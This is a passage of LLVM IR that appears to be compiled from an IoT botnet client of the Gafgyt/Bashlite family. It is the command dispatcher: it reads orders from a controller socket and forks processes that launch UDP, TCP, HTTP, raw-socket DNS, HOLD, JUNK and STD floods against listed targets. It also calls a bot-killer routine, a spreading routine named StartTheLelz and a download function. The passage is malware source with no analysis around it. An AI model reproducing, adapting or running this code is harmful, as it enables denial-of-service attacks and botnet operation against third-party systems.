  %90 = load i32, i32* @mainCommSock, align 4
  %91 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %92 = tail call i8* @inet_ntoa(i32 %91) #3
  %93 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %90, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.450, i64 0, i64 0), i8* %92)
  %94 = icmp sgt i32 %84, 0
  br i1 %94, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %89
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.0197235 = phi i32 [ %95, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  tail call void @StartTheLelz(i32 10, i32 8192)
  %95 = add nuw nsw i32 %.0197235, 1
  %exitcond = icmp eq i32 %95, %84
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %89
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:96:                                     ; preds = %74, %59
  %97 = load i8*, i8** %1, align 8
  %98 = tail call i32 @strcmp(i8* %97, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.451, i64 0, i64 0)) #15
  %99 = icmp eq i32 %98, 0
  br i1 %99, label %100, label %108

; <label>:100:                                    ; preds = %96
  %101 = tail call i32 @listFork()
  %102 = icmp eq i32 %101, 0
  br i1 %102, label %103, label %108

; <label>:103:                                    ; preds = %100
  %104 = load i32, i32* @mainCommSock, align 4
  %105 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %106 = tail call i8* @inet_ntoa(i32 %105) #3
  %107 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %104, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.452, i64 0, i64 0), i8* %106)
  tail call void @botkiller()
  unreachable

; <label>:108:                                    ; preds = %100, %96
  %109 = load i8*, i8** %1, align 8
  %110 = tail call i32 @strcmp(i8* %109, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.453, i64 0, i64 0)) #15
  %111 = icmp eq i32 %110, 0
  br i1 %111, label %112, label %117

; <label>:112:                                    ; preds = %108
  %113 = load i32, i32* @mainCommSock, align 4
  %114 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %115 = tail call i8* @inet_ntoa(i32 %114) #3
  %116 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %113, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.454, i64 0, i64 0), i8* %115)
  br label %.loopexit

; <label>:117:                                    ; preds = %108
  %118 = tail call i32 @strcmp(i8* %109, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.455, i64 0, i64 0)) #15
  %119 = icmp eq i32 %118, 0
  br i1 %119, label %120, label %195

; <label>:120:                                    ; preds = %117
  %121 = icmp slt i32 %0, 6
  br i1 %121, label %152, label %122

; <label>:122:                                    ; preds = %120
  %123 = getelementptr inbounds i8*, i8** %1, i64 3
  %124 = load i8*, i8** %123, align 8
  %125 = tail call i32 @atoi(i8* %124) #15
  %126 = icmp eq i32 %125, -1
  br i1 %126, label %152, label %127

; <label>:127:                                    ; preds = %122
  %128 = getelementptr inbounds i8*, i8** %1, i64 2
  %129 = load i8*, i8** %128, align 8
  %130 = tail call i32 @atoi(i8* %129) #15
  %131 = icmp eq i32 %130, -1
  br i1 %131, label %152, label %132

; <label>:132:                                    ; preds = %127
  %133 = getelementptr inbounds i8*, i8** %1, i64 4
  %134 = load i8*, i8** %133, align 8
  %135 = tail call i32 @atoi(i8* %134) #15
  %136 = icmp eq i32 %135, -1
  br i1 %136, label %152, label %137

; <label>:137:                                    ; preds = %132
  %138 = getelementptr inbounds i8*, i8** %1, i64 5
  %139 = load i8*, i8** %138, align 8
  %140 = tail call i32 @atoi(i8* %139) #15
  %141 = icmp eq i32 %140, -1
  %142 = icmp sgt i32 %140, 65500
  %143 = or i1 %142, %141
  %144 = icmp sgt i32 %135, 32
  %or.cond210 = or i1 %144, %143
  br i1 %or.cond210, label %152, label %145

; <label>:145:                                    ; preds = %137
  %146 = icmp eq i32 %0, 7
  br i1 %146, label %147, label %155

; <label>:147:                                    ; preds = %145
  %148 = getelementptr inbounds i8*, i8** %1, i64 6
  %149 = load i8*, i8** %148, align 8
  %150 = tail call i32 @atoi(i8* %149) #15
  %151 = icmp slt i32 %150, 1
  br i1 %151, label %152, label %155

; <label>:152:                                    ; preds = %147, %137, %132, %127, %122, %120
  %153 = load i32, i32* @mainCommSock, align 4
  %154 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %153, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.456, i64 0, i64 0))
  br label %.loopexit

; <label>:155:                                    ; preds = %147, %145
  %156 = getelementptr inbounds i8*, i8** %1, i64 1
  %157 = load i8*, i8** %156, align 8
  %158 = load i8*, i8** %128, align 8
  %159 = tail call i32 @atoi(i8* %158) #15
  %160 = load i8*, i8** %123, align 8
  %161 = tail call i32 @atoi(i8* %160) #15
  %162 = load i8*, i8** %133, align 8
  %163 = tail call i32 @atoi(i8* %162) #15
  %164 = load i8*, i8** %138, align 8
  %165 = tail call i32 @atoi(i8* %164) #15
  %166 = icmp sgt i32 %0, 6
  br i1 %166, label %167, label %.thread217

; <label>:167:                                    ; preds = %155
  %168 = getelementptr inbounds i8*, i8** %1, i64 6
  %169 = load i8*, i8** %168, align 8
  %170 = tail call i32 @atoi(i8* %169) #15
  %171 = icmp eq i32 %0, 7
  br i1 %171, label %.thread217, label %172

; <label>:172:                                    ; preds = %167
  %173 = getelementptr inbounds i8*, i8** %1, i64 7
  %174 = load i8*, i8** %173, align 8
  %175 = tail call i32 @atoi(i8* %174) #15
  %176 = icmp sgt i32 %0, 8
  br i1 %176, label %177, label %.thread217

; <label>:177:                                    ; preds = %172
  %178 = getelementptr inbounds i8*, i8** %1, i64 8
  %179 = load i8*, i8** %178, align 8
  %180 = tail call i32 @atoi(i8* %179) #15
  br label %.thread217

.thread217:                                       ; preds = %167, %155, %172, %177
  %181 = phi i32 [ %175, %177 ], [ %175, %172 ], [ 1000000, %167 ], [ 1000000, %155 ]
  %182 = phi i32 [ %170, %177 ], [ %170, %172 ], [ %170, %167 ], [ 1000, %155 ]
  %183 = phi i32 [ %180, %177 ], [ 0, %172 ], [ 0, %167 ], [ 0, %155 ]
  %strchr = tail call i8* @strchr(i8* %157, i32 44)
  %184 = icmp eq i8* %strchr, null
  br i1 %184, label %191, label %.preheader.preheader

.preheader.preheader:                             ; preds = %.thread217
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %187
  %.sink = phi i8* [ null, %187 ], [ %157, %.preheader.preheader ]
  %185 = tail call i8* @strtok(i8* %.sink, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i64 0, i64 0)) #3
  %186 = icmp eq i8* %185, null
  br i1 %186, label %.loopexit.loopexit, label %187

; <label>:187:                                    ; preds = %.preheader
  %188 = tail call i32 @listFork()
  %189 = icmp eq i32 %188, 0
  br i1 %189, label %190, label %.preheader

; <label>:190:                                    ; preds = %187
  tail call void @sendUDP(i8* nonnull %185, i32 %159, i32 %161, i32 %163, i32 %165, i32 %182, i32 %181, i32 %183)
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:191:                                    ; preds = %.thread217
  %192 = tail call i32 @listFork()
  %193 = icmp eq i32 %192, 0
  br i1 %193, label %194, label %.loopexit

; <label>:194:                                    ; preds = %191
  tail call void @sendUDP(i8* %157, i32 %159, i32 %161, i32 %163, i32 %165, i32 %182, i32 %181, i32 %183)
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:195:                                    ; preds = %117
  %196 = tail call i32 @strcmp(i8* %109, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.457, i64 0, i64 0)) #15
  %197 = icmp eq i32 %196, 0
  br i1 %197, label %198, label %.loopexit229

; <label>:198:                                    ; preds = %195
  %199 = icmp slt i32 %0, 6
  br i1 %199, label %230, label %200

; <label>:200:                                    ; preds = %198
  %201 = getelementptr inbounds i8*, i8** %1, i64 3
  %202 = load i8*, i8** %201, align 8
  %203 = tail call i32 @atoi(i8* %202) #15
  %204 = icmp eq i32 %203, -1
  br i1 %204, label %230, label %205

; <label>:205:                                    ; preds = %200
  %206 = getelementptr inbounds i8*, i8** %1, i64 2
  %207 = load i8*, i8** %206, align 8
  %208 = tail call i32 @atoi(i8* %207) #15
  %209 = icmp eq i32 %208, -1
  br i1 %209, label %230, label %210

; <label>:210:                                    ; preds = %205
  %211 = getelementptr inbounds i8*, i8** %1, i64 4
  %212 = load i8*, i8** %211, align 8
  %213 = tail call i32 @atoi(i8* %212) #15
  %214 = icmp eq i32 %213, -1
  %215 = icmp sgt i32 %213, 32
  %or.cond211 = or i1 %214, %215
  br i1 %or.cond211, label %230, label %216

; <label>:216:                                    ; preds = %210
  %217 = icmp sgt i32 %0, 6
  br i1 %217, label %218, label %.thread218

; <label>:218:                                    ; preds = %216
  %219 = getelementptr inbounds i8*, i8** %1, i64 6
  %220 = load i8*, i8** %219, align 8
  %221 = tail call i32 @atoi(i8* %220) #15
  %222 = icmp slt i32 %221, 0
  br i1 %222, label %230, label %223

; <label>:223:                                    ; preds = %218
  %224 = icmp eq i32 %0, 8
  br i1 %224, label %225, label %.thread218

; <label>:225:                                    ; preds = %223
  %226 = getelementptr inbounds i8*, i8** %1, i64 7
  %227 = load i8*, i8** %226, align 8
  %228 = tail call i32 @atoi(i8* %227) #15
  %229 = icmp slt i32 %228, 1
  br i1 %229, label %230, label %.thread218

; <label>:230:                                    ; preds = %225, %218, %210, %205, %200, %198
  %231 = load i32, i32* @mainCommSock, align 4
  %232 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %231, i8* getelementptr inbounds ([186 x i8], [186 x i8]* @.str.458, i64 0, i64 0))
  br label %.loopexit

.thread218:                                       ; preds = %216, %225, %223
  %233 = phi i1 [ true, %225 ], [ false, %223 ], [ false, %216 ]
  %234 = getelementptr inbounds i8*, i8** %1, i64 1
  %235 = load i8*, i8** %234, align 8
  %236 = load i8*, i8** %206, align 8
  %237 = tail call i32 @atoi(i8* %236) #15
  %238 = load i8*, i8** %201, align 8
  %239 = tail call i32 @atoi(i8* %238) #15
  %240 = load i8*, i8** %211, align 8
  %241 = tail call i32 @atoi(i8* %240) #15
  %242 = getelementptr inbounds i8*, i8** %1, i64 5
  %243 = load i8*, i8** %242, align 8
  br i1 %233, label %244, label %248

; <label>:244:                                    ; preds = %.thread218
  %245 = getelementptr inbounds i8*, i8** %1, i64 7
  %246 = load i8*, i8** %245, align 8
  %247 = tail call i32 @atoi(i8* %246) #15
  br label %248

; <label>:248:                                    ; preds = %.thread218, %244
  %249 = phi i32 [ %247, %244 ], [ 10, %.thread218 ]
  br i1 %217, label %250, label %254

; <label>:250:                                    ; preds = %248
  %251 = getelementptr inbounds i8*, i8** %1, i64 6
  %252 = load i8*, i8** %251, align 8
  %253 = tail call i32 @atoi(i8* %252) #15
  br label %254

; <label>:254:                                    ; preds = %248, %250
  %255 = phi i32 [ %253, %250 ], [ 0, %248 ]
  %strchr204 = tail call i8* @strchr(i8* %235, i32 44)
  %256 = icmp eq i8* %strchr204, null
  br i1 %256, label %263, label %.preheader228.preheader

.preheader228.preheader:                          ; preds = %254
  br label %.preheader228

.preheader228:                                    ; preds = %.preheader228.preheader, %259
  %.sink212 = phi i8* [ null, %259 ], [ %235, %.preheader228.preheader ]
  %257 = tail call i8* @strtok(i8* %.sink212, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i64 0, i64 0)) #3
  %258 = icmp eq i8* %257, null
  br i1 %258, label %.loopexit229.loopexit, label %259

; <label>:259:                                    ; preds = %.preheader228
  %260 = tail call i32 @listFork()
  %261 = icmp eq i32 %260, 0
  br i1 %261, label %262, label %.preheader228

; <label>:262:                                    ; preds = %259
  tail call void @sendTCP(i8* nonnull %257, i32 %237, i32 %239, i32 %241, i8* %243, i32 %255, i32 %249)
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:263:                                    ; preds = %254
  %264 = tail call i32 @listFork()
  %265 = icmp eq i32 %264, 0
  br i1 %265, label %266, label %.loopexit229

; <label>:266:                                    ; preds = %263
  tail call void @sendTCP(i8* %235, i32 %237, i32 %239, i32 %241, i8* %243, i32 %255, i32 %249)
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit229.loopexit:                            ; preds = %.preheader228
  br label %.loopexit229

.loopexit229:                                     ; preds = %.loopexit229.loopexit, %263, %195
  %267 = load i8*, i8** %1, align 8
  %268 = tail call i32 @strcmp(i8* %267, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.459, i64 0, i64 0)) #15
  %269 = icmp eq i32 %268, 0
  br i1 %269, label %270, label %.loopexit227

; <label>:270:                                    ; preds = %.loopexit229
  %271 = icmp slt i32 %0, 6
  br i1 %271, label %272, label %275

; <label>:272:                                    ; preds = %270
  %273 = load i32, i32* @mainCommSock, align 4
  %274 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %273, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.460, i64 0, i64 0))
  br label %.loopexit

; <label>:275:                                    ; preds = %270
  %276 = getelementptr inbounds i8*, i8** %1, i64 1
  %277 = load i8*, i8** %276, align 8
  %strchr205 = tail call i8* @strchr(i8* %277, i32 44)
  %278 = icmp eq i8* %strchr205, null
  br i1 %278, label %300, label %.preheader226.preheader

.preheader226.preheader:                          ; preds = %275
  br label %.preheader226

.preheader226:                                    ; preds = %.preheader226.preheader, %281
  %.sink213 = phi i8* [ null, %281 ], [ %277, %.preheader226.preheader ]
  %279 = tail call i8* @strtok(i8* %.sink213, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i64 0, i64 0)) #3
  %280 = icmp eq i8* %279, null
  br i1 %280, label %.loopexit227.loopexit, label %281

; <label>:281:                                    ; preds = %.preheader226
  %282 = tail call i32 @listFork()
  %283 = icmp eq i32 %282, 0
  br i1 %283, label %284, label %.preheader226

; <label>:284:                                    ; preds = %281
  %285 = load i8*, i8** %276, align 8
  %286 = getelementptr inbounds i8*, i8** %1, i64 2
  %287 = load i8*, i8** %286, align 8
  %288 = getelementptr inbounds i8*, i8** %1, i64 3
  %289 = load i8*, i8** %288, align 8
  %290 = tail call i32 @atoi(i8* %289) #15
  %291 = trunc i32 %290 to i16
  %292 = getelementptr inbounds i8*, i8** %1, i64 4
  %293 = load i8*, i8** %292, align 8
  %294 = getelementptr inbounds i8*, i8** %1, i64 5
  %295 = load i8*, i8** %294, align 8
  %296 = tail call i32 @atoi(i8* %295) #15
  %297 = getelementptr inbounds i8*, i8** %1, i64 6
  %298 = load i8*, i8** %297, align 8
  %299 = tail call i32 @atoi(i8* %298) #15
  tail call void @sendHTTP(i8* %285, i8* %287, i16 zeroext %291, i8* %293, i32 %296, i32 %299)
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:300:                                    ; preds = %275
  %301 = tail call i32 @listFork()
  %302 = icmp eq i32 %301, 0
  br i1 %302, label %303, label %.loopexit

; <label>:303:                                    ; preds = %300
  %304 = load i8*, i8** %276, align 8
  %305 = getelementptr inbounds i8*, i8** %1, i64 2
  %306 = load i8*, i8** %305, align 8
  %307 = getelementptr inbounds i8*, i8** %1, i64 3
  %308 = load i8*, i8** %307, align 8
  %309 = tail call i32 @atoi(i8* %308) #15
  %310 = trunc i32 %309 to i16
  %311 = getelementptr inbounds i8*, i8** %1, i64 4
  %312 = load i8*, i8** %311, align 8
  %313 = getelementptr inbounds i8*, i8** %1, i64 5
  %314 = load i8*, i8** %313, align 8
  %315 = tail call i32 @atoi(i8* %314) #15
  %316 = getelementptr inbounds i8*, i8** %1, i64 6
  %317 = load i8*, i8** %316, align 8
  %318 = tail call i32 @atoi(i8* %317) #15
  tail call void @sendHTTP(i8* %304, i8* %306, i16 zeroext %310, i8* %312, i32 %315, i32 %318)
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit227.loopexit:                            ; preds = %.preheader226
  br label %.loopexit227

.loopexit227:                                     ; preds = %.loopexit227.loopexit, %.loopexit229
  %319 = load i8*, i8** %1, align 8
  %320 = tail call i32 @strcmp(i8* %319, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.461, i64 0, i64 0)) #15
  %321 = icmp eq i32 %320, 0
  br i1 %321, label %322, label %375

; <label>:322:                                    ; preds = %.loopexit227
  %323 = tail call i32 @socket(i32 2, i32 3, i32 255) #3
  %324 = icmp slt i32 %323, 0
  br i1 %324, label %325, label %326

; <label>:325:                                    ; preds = %322
  tail call void @exit(i32 1) #17
  unreachable

; <label>:326:                                    ; preds = %322
  %327 = icmp slt i32 %0, 6
  br i1 %327, label %328, label %331

; <label>:328:                                    ; preds = %326
  %329 = load i32, i32* @mainCommSock, align 4
  %330 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %329, i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.462, i64 0, i64 0))
  tail call void @exit(i32 0) #17
  unreachable

; <label>:331:                                    ; preds = %326
  %332 = tail call i32 @listFork()
  %333 = icmp eq i32 %332, 0
  br i1 %333, label %334, label %375

; <label>:334:                                    ; preds = %331
  %335 = tail call i64 @time(i64* null) #3
  %336 = trunc i64 %335 to i32
  tail call void @srand(i32 %336) #3
  %337 = getelementptr inbounds i8*, i8** %1, i64 4
  %338 = load i8*, i8** %337, align 8
  %339 = tail call i32 @atoi(i8* %338) #15
  %340 = getelementptr inbounds i8*, i8** %1, i64 5
  %341 = getelementptr inbounds i8*, i8** %1, i64 3
  %342 = load i8*, i8** %341, align 8
  %343 = tail call i32 @download(i8* %342, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.418, i64 0, i64 0))
  %344 = load i32, i32* @mainCommSock, align 4
  %345 = getelementptr inbounds i8*, i8** %1, i64 1
  %346 = load i8*, i8** %345, align 8
  %347 = getelementptr inbounds i8*, i8** %1, i64 2
  %348 = load i8*, i8** %347, align 8
  %349 = getelementptr inbounds i8*, i8** %1, i64 6
  %350 = load i8*, i8** %349, align 8
  %351 = tail call i32 @atoi(i8* %350) #15
  %352 = load i8*, i8** %340, align 8
  %353 = tail call i32 @atoi(i8* %352) #15
  %354 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %344, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.463, i64 0, i64 0), i8* %346, i8* %348, i32 %351, i32 %353)
  %355 = zext i32 %339 to i64
  %356 = tail call i8* @llvm.stacksave()
  %357 = alloca %struct.thread_data, i64 %355, align 16
  %358 = icmp sgt i32 %339, 0
  br i1 %358, label %.lr.ph242, label %._crit_edge243

.lr.ph242:                                        ; preds = %334
  %359 = bitcast i8** %345 to i64*
  %wide.trip.count = zext i32 %339 to i64
  br label %360

; <label>:360:                                    ; preds = %360, %.lr.ph242
  %indvars.iv = phi i64 [ 0, %.lr.ph242 ], [ %indvars.iv.next, %360 ]
  %361 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %357, i64 %indvars.iv
  %362 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %361, i64 0, i32 0
  %363 = trunc i64 %indvars.iv to i32
  store i32 %363, i32* %362, align 16
  %364 = load i64, i64* %359, align 8
  %365 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %357, i64 %indvars.iv, i32 1
  %366 = bitcast i8** %365 to i64*
  store i64 %364, i64* %366, align 8
  %367 = load i8*, i8** %347, align 8
  %368 = tail call i32 @atoi(i8* %367) #15
  %369 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %357, i64 %indvars.iv, i32 2
  store i32 %368, i32* %369, align 16
  %370 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %357, i64 %indvars.iv, i32 3
  store i32 0, i32* %370, align 4
  %371 = load i8*, i8** %349, align 8
  %372 = tail call i32 @atoi(i8* %371) #15
  %373 = getelementptr inbounds %struct.thread_data, %struct.thread_data* %357, i64 %indvars.iv, i32 4
  store i32 %372, i32* %373, align 8
  %374 = bitcast %struct.thread_data* %361 to i8*
  call void @dnsflood(i8* %374)
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond249 = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond249, label %._crit_edge243.loopexit, label %360

._crit_edge243.loopexit:                          ; preds = %360
  br label %._crit_edge243

._crit_edge243:                                   ; preds = %._crit_edge243.loopexit, %334
  tail call void @llvm.stackrestore(i8* %356)
  br label %375

; <label>:375:                                    ; preds = %331, %.loopexit227, %._crit_edge243
  %376 = load i8*, i8** %1, align 8
  %377 = tail call i32 @strcmp(i8* %376, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.464, i64 0, i64 0)) #15
  %378 = icmp eq i32 %377, 0
  br i1 %378, label %379, label %.loopexit225

; <label>:379:                                    ; preds = %375
  %380 = icmp slt i32 %0, 4
  br i1 %380, label %391, label %381

; <label>:381:                                    ; preds = %379
  %382 = getelementptr inbounds i8*, i8** %1, i64 2
  %383 = load i8*, i8** %382, align 8
  %384 = tail call i32 @atoi(i8* %383) #15
  %385 = icmp slt i32 %384, 1
  br i1 %385, label %391, label %386

; <label>:386:                                    ; preds = %381
  %387 = getelementptr inbounds i8*, i8** %1, i64 3
  %388 = load i8*, i8** %387, align 8
  %389 = tail call i32 @atoi(i8* %388) #15
  %390 = icmp slt i32 %389, 1
  br i1 %390, label %391, label %394

; <label>:391:                                    ; preds = %386, %381, %379
  %392 = load i32, i32* @mainCommSock, align 4
  %393 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %392, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.465, i64 0, i64 0))
  br label %.loopexit

; <label>:394:                                    ; preds = %386
  %395 = getelementptr inbounds i8*, i8** %1, i64 1
  %396 = load i8*, i8** %395, align 8
  %strchr206 = tail call i8* @strchr(i8* %396, i32 44)
  %397 = icmp eq i8* %strchr206, null
  br i1 %397, label %406, label %.preheader224.preheader

.preheader224.preheader:                          ; preds = %394
  br label %.preheader224

.preheader224:                                    ; preds = %.preheader224.preheader, %400
  %.sink214 = phi i8* [ null, %400 ], [ %396, %.preheader224.preheader ]
  %398 = tail call i8* @strtok(i8* %.sink214, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i64 0, i64 0)) #3
  %399 = icmp eq i8* %398, null
  br i1 %399, label %.loopexit225.loopexit, label %400

; <label>:400:                                    ; preds = %.preheader224
  %401 = tail call i32 @listFork()
  %402 = icmp eq i32 %401, 0
  br i1 %402, label %403, label %.preheader224

; <label>:403:                                    ; preds = %400
  tail call void @sendHOLD(i8* nonnull %398, i32 %384, i32 %389)
  %404 = load i32, i32* @mainCommSock, align 4
  %405 = tail call i32 @close(i32 %404) #3
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:406:                                    ; preds = %394
  %407 = tail call i32 @listFork()
  %408 = icmp eq i32 %407, 0
  br i1 %408, label %409, label %.loopexit

; <label>:409:                                    ; preds = %406
  tail call void @sendHOLD(i8* %396, i32 %384, i32 %389)
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit225.loopexit:                            ; preds = %.preheader224
  br label %.loopexit225

.loopexit225:                                     ; preds = %.loopexit225.loopexit, %375
  %410 = load i8*, i8** %1, align 8
  %411 = tail call i32 @strcmp(i8* %410, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.466, i64 0, i64 0)) #15
  %412 = icmp eq i32 %411, 0
  br i1 %412, label %413, label %.loopexit223

; <label>:413:                                    ; preds = %.loopexit225
  %414 = icmp slt i32 %0, 3
  br i1 %414, label %420, label %415

; <label>:415:                                    ; preds = %413
  %416 = getelementptr inbounds i8*, i8** %1, i64 3
  %417 = load i8*, i8** %416, align 8
  %418 = tail call i32 @atoi(i8* %417) #15
  %419 = icmp slt i32 %418, 0
  br i1 %419, label %420, label %423

; <label>:420:                                    ; preds = %415, %413
  %421 = load i32, i32* @mainCommSock, align 4
  %422 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %421, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.467, i64 0, i64 0))
  br label %.loopexit

; <label>:423:                                    ; preds = %415
  %424 = getelementptr inbounds i8*, i8** %1, i64 1
  %425 = load i8*, i8** %424, align 8
  %426 = getelementptr inbounds i8*, i8** %1, i64 2
  %427 = load i8*, i8** %426, align 8
  %428 = tail call i32 @atoi(i8* %427) #15
  %strchr207 = tail call i8* @strchr(i8* %425, i32 44)
  %429 = icmp eq i8* %strchr207, null
  br i1 %429, label %438, label %.preheader222.preheader

.preheader222.preheader:                          ; preds = %423
  br label %.preheader222

.preheader222:                                    ; preds = %.preheader222.preheader, %432
  %.sink215 = phi i8* [ null, %432 ], [ %425, %.preheader222.preheader ]
  %430 = tail call i8* @strtok(i8* %.sink215, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i64 0, i64 0)) #3
  %431 = icmp eq i8* %430, null
  br i1 %431, label %.loopexit223.loopexit, label %432

; <label>:432:                                    ; preds = %.preheader222
  %433 = tail call i32 @listFork()
  %434 = icmp eq i32 %433, 0
  br i1 %434, label %435, label %.preheader222

; <label>:435:                                    ; preds = %432
  tail call void @sendJUNK(i8* nonnull %430, i32 %428, i32 %418)
  %436 = load i32, i32* @mainCommSock, align 4
  %437 = tail call i32 @close(i32 %436) #3
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:438:                                    ; preds = %423
  %439 = tail call i32 @listFork()
  %440 = icmp eq i32 %439, 0
  br i1 %440, label %441, label %.loopexit

; <label>:441:                                    ; preds = %438
  tail call void @sendJUNK(i8* %425, i32 %428, i32 %418)
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit223.loopexit:                            ; preds = %.preheader222
  br label %.loopexit223

.loopexit223:                                     ; preds = %.loopexit223.loopexit, %.loopexit225
  %442 = load i8*, i8** %1, align 8
  %443 = tail call i32 @strcmp(i8* %442, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.468, i64 0, i64 0)) #15
  %444 = icmp eq i32 %443, 0
  br i1 %444, label %445, label %.loopexit221

; <label>:445:                                    ; preds = %.loopexit223
  %446 = icmp slt i32 %0, 4
  br i1 %446, label %457, label %447

; <label>:447:                                    ; preds = %445
  %448 = getelementptr inbounds i8*, i8** %1, i64 2
  %449 = load i8*, i8** %448, align 8
  %450 = tail call i32 @atoi(i8* %449) #15
  %451 = icmp slt i32 %450, 1
  br i1 %451, label %457, label %452

; <label>:452:                                    ; preds = %447
  %453 = getelementptr inbounds i8*, i8** %1, i64 3
  %454 = load i8*, i8** %453, align 8
  %455 = tail call i32 @atoi(i8* %454) #15
  %456 = icmp slt i32 %455, 1
  br i1 %456, label %457, label %460

; <label>:457:                                    ; preds = %452, %447, %445
  %458 = load i32, i32* @mainCommSock, align 4
  %459 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %458, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.469, i64 0, i64 0))
  br label %.loopexit

; <label>:460:                                    ; preds = %452
  %461 = getelementptr inbounds i8*, i8** %1, i64 1
  %462 = load i8*, i8** %461, align 8
  %strchr208 = tail call i8* @strchr(i8* %462, i32 44)
  %463 = icmp eq i8* %strchr208, null
  br i1 %463, label %470, label %.preheader220.preheader

.preheader220.preheader:                          ; preds = %460
  br label %.preheader220

.preheader220:                                    ; preds = %.preheader220.preheader, %466
  %.sink216 = phi i8* [ null, %466 ], [ %462, %.preheader220.preheader ]
  %464 = tail call i8* @strtok(i8* %.sink216, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i64 0, i64 0)) #3
  %465 = icmp eq i8* %464, null
  br i1 %465, label %.loopexit221.loopexit, label %466

; <label>:466:                                    ; preds = %.preheader220
  %467 = tail call i32 @listFork()
  %468 = icmp eq i32 %467, 0
  br i1 %468, label %469, label %.preheader220

; <label>:469:                                    ; preds = %466
  tail call void @sendSTD(i8* nonnull %464, i32 %450, i32 %455)
  unreachable

; <label>:470:                                    ; preds = %460
  %471 = tail call i32 @listFork()
  %472 = icmp eq i32 %471, 0
  br i1 %472, label %473, label %.loopexit

; <label>:473:                                    ; preds = %470
  tail call void @sendSTD(i8* %462, i32 %450, i32 %455)
  unreachable

.loopexit221.loopexit:                            ; preds = %.preheader220
  br label %.loopexit221

.loopexit221:                                     ; preds = %.loopexit221.loopexit, %.loopexit223
  %474 = load i8*, i8** %1, align 8
  %475 = tail call i32 @strcmp(i8* %474, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.470, i64 0, i64 0)) #15
  %476 = icmp eq i32 %475, 0
  br i1 %476, label %.preheader219, label %505

.preheader219:                                    ; preds = %.loopexit221
  %477 = load i32, i32* @numpids, align 4
  %478 = icmp eq i32 %477, 0
  br i1 %478, label %._crit_edge239.thread, label %.lr.ph238.preheader

.lr.ph238.preheader:                              ; preds = %.preheader219
  br label %.lr.ph238

._crit_edge239.thread:                            ; preds = %.preheader219
  %479 = load i32, i32* @mainCommSock, align 4
  br label %502

.lr.ph238:                                        ; preds = %.lr.ph238.preheader, %493
  %.0237 = phi i64 [ %494, %493 ], [ 0, %.lr.ph238.preheader ]
  %.0195236 = phi i32 [ %.1, %493 ], [ 0, %.lr.ph238.preheader ]
  %480 = load i32*, i32** @pids, align 8
  %481 = getelementptr inbounds i32, i32* %480, i64 %.0237
  %482 = load i32, i32* %481, align 4
  %483 = icmp eq i32 %482, 0
  br i1 %483, label %493, label %484

; <label>:484:                                    ; preds = %.lr.ph238
  %485 = tail call i32 @getpid() #3
